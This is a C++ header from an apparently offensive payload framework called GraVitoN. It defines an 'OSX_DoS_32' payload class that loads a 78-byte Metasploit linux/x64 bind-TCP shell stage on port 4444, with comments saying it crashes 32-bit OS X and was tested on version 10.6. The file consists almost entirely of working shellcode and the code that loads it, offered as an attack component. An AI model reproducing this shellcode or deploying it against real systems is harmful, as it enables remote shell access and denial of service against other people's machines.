/**
 * @file
 * @author  Sina Hatef Matbue ( _null_ ) <sinahatef.cpp@gmail.com>
 *
 * @section License
 *
 * This file is part of GraVitoN.
 *
 * Graviton is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Graviton is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Graviton.  If not, see http://www.gnu.org/licenses/.
 *
 * @brief OSX_DoS_32
 *
 */

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
#ifndef _GVN_OSX_DoS_32_HEAD_
#define _GVN_OSX_DoS_32_HEAD_

#include <payload/payload.hpp>

#include <cstdio>
#include <cstdlib>
#include <sys/mman.h>
#include <errno.h>

namespace GraVitoN
{

    namespace Payload
    {

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
/**
 * @brief OSX 32 bit DoS Shell
 *
 * Loading a linux x64 bind shell on OSX x86 means DoS
 * Successfully tested on 10.6.
 * 
 * @see Payload_Sample
 */
        class OSX_DoS_32 : public Payload::Binary_Payload
        {
        protected:
            virtual bool initPayload();
	
        public:
            OSX_DoS_32();
            virtual ~OSX_DoS_32();

            virtual bool initialize ();
        };

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
        OSX_DoS_32::OSX_DoS_32()
        {
            jumper = _null_;
        }

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
        OSX_DoS_32::~OSX_DoS_32()
        {
            delete payload;
        }

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
        bool OSX_DoS_32::initPayload()
        {
            /*
             * linux/x64/shell/bind_tcp - 78 bytes (stage 1)
             * http://www.metasploit.com
             * VERBOSE=false, LPORT=4444, PrependSetresuid=false,
             * PrependSetreuid=false, PrependSetuid=false,
             * PrependChrootBreak=false, AppendExit=false,
             * InitialAutoRunScript=, AutoRunScript=
             */
            unsigned char buf[] =
                "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x52"
                "\xc7\x04\x24\x02\x00\x11\x5c\x48\x89\xe6\x6a\x10\x5a\x6a\x31"
                "\x58\x0f\x05\x59\x6a\x32\x58\x0f\x05\x48\x96\x6a\x2b\x58\x0f"
                "\x05\x50\x56\x5f\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31"
                "\xc9\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x96\x48\x97\x5f\x0f"
                "\x05\xff\xe6";
	
            int buf_len = 78;

            payload_size = buf_len;
            payload = new unsigned char[payload_size];
            memcpy ( payload, buf, payload_size * sizeof ( unsigned char ) );

            return true;
        }

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
        bool OSX_DoS_32::initialize ()
        {
            Core::Logger::logIt ( "init payload... " );
            initPayload();
            Core::Logger::logItLn ( "done" );

            return true;
        }

    }
}
#endif // _GVN_OSX_DoS_32_HEAD_
